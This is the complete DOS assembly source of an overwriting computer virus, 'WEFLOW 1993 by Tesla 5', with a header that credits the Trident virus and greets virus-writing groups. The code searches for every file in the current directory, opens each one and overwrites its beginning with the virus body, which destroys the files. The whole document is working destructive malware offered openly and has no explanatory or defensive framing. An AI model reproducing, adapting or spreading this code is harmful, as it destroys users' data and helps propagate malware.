;|
;|      WEFLOW 1993 VIRUS BY TESLA 5
;|
;|      THIS VIRUS IS BASED ON THE TRIDENT OVERWRITING VIRUS. SORRY FOR
;|      LAMING AROUND, BUT IT KEEPS VARIANTS RISING. GREETINGS TO TRIDENT,
;|      NUKE, PHALCON/SKISM AND YAM. YOU DON'T KNOW ME, BUT I DO...
;|
                ORG 100H

MAIN:           MOV AH,4EH
NOTSOCOOL:      LEA DX,FF
                INT 21H
                JNC COOL
                RET

COOL:           MOV AX,3D02H
                MOV DX,9EH
                INT 21H

                XCHG AX,BX
                MOV CL,VLEN
                MOV AH,40H
                INT 21H

                MOV AH,3EH
                INT 21H

                MOV AH,4FH
                JMP NOTSOCOOL

FF              DB '*.*',0

                DB 'WEFLOW93'

VLEN            EQU $-MAIN
